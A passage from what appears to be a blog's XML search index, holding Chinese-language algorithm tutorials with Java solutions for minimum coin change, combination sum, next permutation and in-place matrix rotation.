mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>target <span class="token operator">></span> nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> target <span class="token operator">&lt;=</span> nums<span class="token punctuation">[</span>high<span class="token punctuation">]</span><span class="token punctuation">)</span> low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> high <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 数组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最小硬币组合</title>
      <link href="/2019/01/06/suan-fa/shu-zu/zui-xiao-ying-bi-zu-he/"/>
      <url>/2019/01/06/suan-fa/shu-zu/zui-xiao-ying-bi-zu-he/</url>
      
        <content type="html"><![CDATA[<h2 id="最小硬币组合"><a href="#最小硬币组合" class="headerlink" title="最小硬币组合"></a>最小硬币组合</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一些面值不同的硬币，每一种面值的硬币都有无限多个，现在你要用这些硬币组成一个给定的数值，那么请问，最少需要多少个硬币。另外，如果给你的面值无法组成给定数值，就返回 -1。</p><pre><code>比如说，给你的硬币有 1 分 2 分两种面值，现在你要用它们凑 4 分钱。我们知道用 1 分 2 分凑 4 分有 3 种组合：4 = 1 + 1 + 1 + 14 = 1 + 1 + 24 = 2 + 2其中使用了最少硬币的组合是 2 + 2，用了两个硬币，于是要返回的答案就是 2。</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Time: O(n*sum), Space: O(n*sum)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">minCoinCombination</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> coins<span class="token punctuation">,</span> <span class="token keyword">int</span> sum<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> d <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span>coins<span class="token punctuation">.</span>length<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>sum<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> sum<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span>      d<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> Integer<span class="token punctuation">.</span>MAX_VALUE<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> coins<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> sum<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> useCurCoin <span class="token operator">=</span> j <span class="token operator">>=</span> coins<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">?</span> d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span>coins<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">:</span> Integer<span class="token punctuation">.</span>MAX_VALUE<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>useCurCoin <span class="token operator">!=</span> Integer<span class="token punctuation">.</span>MAX_VALUE<span class="token punctuation">)</span> useCurCoin <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>        d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>d<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> useCurCoin<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> d<span class="token punctuation">[</span>coins<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">[</span>sum<span class="token punctuation">]</span> <span class="token operator">==</span> Integer<span class="token punctuation">.</span>MAX_VALUE <span class="token operator">?</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">:</span> d<span class="token punctuation">[</span>coins<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">[</span>sum<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n*sum), Space: O(sum)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">minCoinCombinationOsum</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> coins<span class="token punctuation">,</span> <span class="token keyword">int</span> sum<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> d <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span>sum<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> sum<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span>      d<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> Integer<span class="token punctuation">.</span>MAX_VALUE<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> coins<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> coins<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> sum<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>d<span class="token punctuation">[</span>j<span class="token operator">-</span>coins<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">!=</span> Integer<span class="token punctuation">.</span>MAX_VALUE<span class="token punctuation">)</span> <span class="token punctuation">{</span>          d<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>d<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> d<span class="token punctuation">[</span>j<span class="token operator">-</span>coins<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> d<span class="token punctuation">[</span>sum<span class="token punctuation">]</span> <span class="token operator">==</span> Integer<span class="token punctuation">.</span>MAX_VALUE <span class="token operator">?</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">:</span> d<span class="token punctuation">[</span>sum<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 数组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>求和为给定值的组合</title>
      <link href="/2019/01/06/suan-fa/shu-zu/qiu-he-wei-gei-ding-zhi-de-zu-he/"/>
      <url>/2019/01/06/suan-fa/shu-zu/qiu-he-wei-gei-ding-zhi-de-zu-he/</url>
      
        <content type="html"><![CDATA[<h2 id="求和为给定值的组合"><a href="#求和为给定值的组合" class="headerlink" title="求和为给定值的组合"></a>求和为给定值的组合</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个<strong>正整数数组</strong>，数组中<strong>不包含重复元素</strong>，同时给你一个<strong>正整数目标值</strong>，你要找到数组中和为目标值的所有组合。另外，数组中每个元素都可以使用无限多次，并且答案中不能包含重复组合。</p><pre><code>比如说，给你的数组是：4, 2, 8给你的目标值是 6。数组中和为 6 的组合有：[4, 2][2, 2, 2]</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">combSum</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> target<span class="token punctuation">,</span> <span class="token keyword">int</span> start<span class="token punctuation">,</span>                       List<span class="token operator">&lt;</span>Integer<span class="token operator">></span> elem<span class="token punctuation">,</span> List<span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>Integer<span class="token operator">>></span> result<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>target <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      result<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>elem<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>target <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> start<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>      elem<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">combSum</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> target<span class="token operator">-</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> elem<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>      elem<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>elem<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// T: O(1)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n^(target/min)), Space: O(target/min)</span>  <span class="token keyword">public</span> List<span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>Integer<span class="token operator">>></span> <span class="token function">combinationSum</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> candidates<span class="token punctuation">,</span> <span class="token keyword">int</span> target<span class="token punctuation">)</span> <span class="token punctuation">{</span>    List<span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>Integer<span class="token operator">>></span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    List<span class="token operator">&lt;</span>Integer<span class="token operator">></span> elem <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">combSum</span><span class="token punctuation">(</span>candidates<span class="token punctuation">,</span> target<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> elem<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">combSumSort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> target<span class="token punctuation">,</span> <span class="token keyword">int</span> start<span class="token punctuation">,</span>                           List<span class="token operator">&lt;</span>Integer<span class="token operator">></span> elem<span class="token punctuation">,</span> List<span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>Integer<span class="token operator">>></span> result<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>target <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      result<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>elem<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>target <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> start<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> target<span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>      elem<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">combSumSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> target<span class="token operator">-</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> elem<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>      elem<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>elem<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// T: O(1)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n^(target/min)), Space: O(target/min)</span>  <span class="token keyword">public</span> List<span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>Integer<span class="token operator">>></span> <span class="token function">combinationSumSort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> candidates<span class="token punctuation">,</span> <span class="token keyword">int</span> target<span class="token punctuation">)</span> <span class="token punctuation">{</span>    List<span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>Integer<span class="token operator">>></span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    List<span class="token operator">&lt;</span>Integer<span class="token operator">></span> elem <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Arrays<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span>candidates<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">combSumSort</span><span class="token punctuation">(</span>candidates<span class="token punctuation">,</span> target<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> elem<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 数组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数组的下一个排列</title>
      <link href="/2019/01/06/suan-fa/shu-zu/shu-zu-de-xia-yi-ge-pai-lie/"/>
      <url>/2019/01/06/suan-fa/shu-zu/shu-zu-de-xia-yi-ge-pai-lie/</url>
      
        <content type="html"><![CDATA[<h2 id="数组的下一个排列"><a href="#数组的下一个排列" class="headerlink" title="数组的下一个排列"></a>数组的下一个排列</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个整数数组，每一个元素是一个 0 到 9 的整数，数组的排列形成了一个有效的数字。你要找到数组的下一个排列，使它形成的数字是大于当前排列的第一个数字。如果当前排列表示的已经是最大数字，则返回这个数组的最小排列。</p><pre><code>比如说，给你的数组是：2, 1, 8, 4, 2, 1这个排列表示整数 218421，你要返回的下一个排列是：2, 2, 1, 1, 4, 8表示 221148，这是数组中的元素所能组成的数字中，大于当前排列的第一个数字。再比如说，给你的数组为：4, 2, 1你没有办法给出一个比它更大的排列，于是返回这些数字所能构成的最小排列：1, 2, 4</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">swap</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> j<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> tmp <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(1)</span>  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">nextPermutation</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>nums <span class="token operator">==</span> null <span class="token operator">||</span> nums<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">int</span> p <span class="token operator">=</span> n <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>p <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">>=</span> nums<span class="token punctuation">[</span>p<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">--</span>p<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">int</span> i <span class="token operator">=</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">></span> p <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> nums<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">--</span>i<span class="token punctuation">;</span>      <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> i<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> p<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">=</span> n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> j<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">,</span> <span class="token operator">--</span>j<span class="token punctuation">)</span>      <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 数组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>旋转二维数组</title>
      <link href="/2019/01/06/suan-fa/shu-zu/xuan-zhuan-er-wei-shu-zu/"/>
      <url>/2019/01/06/suan-fa/shu-zu/xuan-zhuan-er-wei-shu-zu/</url>
      
        <content type="html"><![CDATA[<h2 id="求和为给定值的组合"><a href="#求和为给定值的组合" class="headerlink" title="求和为给定值的组合"></a>求和为给定值的组合</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个 n x n 的二维数组，你要沿顺时针方向将它旋转 90 度。要求你不能使用额外的存储空间，就地在原数组操作。</p><pre><code>比如说，给你的二维数组是：1, 2, 34, 5, 67, 8, 9顺时针旋转 90 度后，得到的二维数组是：7, 4, 18, 5, 29, 6, 3</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Time: O(n^2), Space: O(1)</span>  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">rotate</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> matrix<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>matrix <span class="token operator">==</span> null <span class="token operator">||</span> matrix<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span>      matrix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> null <span class="token operator">||</span> matrix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>      <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> n <span class="token operator">=</span> matrix<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> tmp <span class="token operator">=</span> matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> matrix<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        matrix<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> tmp <span class="token operator">=</span> matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 数组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>硬币面值组合问题</title>
      <link href="/2019/01/06/suan-fa/shu-zu/ying-bi-mian-zhi-zu-he-wen-ti/"/>
      <url>/2019/01/06/suan-fa/shu-zu/ying-bi-mian-zhi-zu-he-wen-ti/</url>
      
